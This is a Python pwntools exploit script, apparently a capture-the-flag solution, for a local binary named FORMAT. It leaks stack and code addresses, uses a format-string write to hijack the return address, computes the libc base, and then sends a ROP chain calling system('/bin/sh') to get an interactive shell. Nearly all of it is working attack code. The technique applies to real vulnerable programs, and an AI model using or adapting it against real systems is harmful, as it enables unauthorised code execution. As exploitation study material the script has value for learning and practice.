#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FORMAT')
#libc = ELF('./libc-2.27.so')
elf = ELF('./FORMAT')

def pr(a,addr):
	log.success(a+': '+hex(addr))
'''
def exec_fmt(pad):
	p = process("./FORMAT")
	# send 还是 sendline以程序为准
	p.sendline(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''
offset = 6
p.recvuntil("Enter your name: ")
p.send("A"*0x8)
p.recvuntil("A"*0x8)
_start = u64(p.recvuntil("\n",drop=True) + p16(0))
codebase = _start &~ 0xfff
main_read_addr = codebase + 0x968
main_puts_addr = codebase + 0x95c

p.recvuntil("Here's your gift: ")
data_addr = int(p.recv(14),16)
ret = data_addr + 0x818

pr('data_addr',data_addr)
pr('rbp',data_addr+0x810)
pr('_start',_start)
pr('codebase',codebase)
pr('main_read_addr',main_read_addr)

#gdb.attach(p)
pause()

p.recvuntil("Please pwn me :)\n")
payload = "%p.%p.%p" + fmtstr_payload(offset+1, {ret:_start}, numbwritten = 35)
p.send(payload)
data = p.recv(0x200)
print(data)

libcbase = int(data[21:35],16) - 0x110031 
do_system = libcbase + 0x4f43b # do_system
binsh_addr = libcbase + 0x1b3d88
prdi_ret = libcbase + 0x2164f # pop rdi; ret
prbp_ret = libcbase + 0x213e3 # pop rbp; ret
pr('libcbase',libcbase)

#==========================again===============================
# 重新执行程序的时候新返回地址就会比之前的返回地址低 0x100 | 0xd0

new_ret = ret - 0xd0
new_rbp = new_ret - 0x8
pr('new_ret',new_ret)
pause()
p.send("A"*0x8)
p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(offset=6,
	writes={new_rbp:new_ret+0x810, new_ret:main_puts_addr}, 
	write_size_max="byte",write_size="byte")

#puts 写入 new_ret 地址处,然后会执行 read
pause()
p.send(payload)
p.recvuntil("Please pwn me :)\n")
payload = p64(prdi_ret) + p64(binsh_addr) + p64(do_system)

p.send(payload)
p.interactive()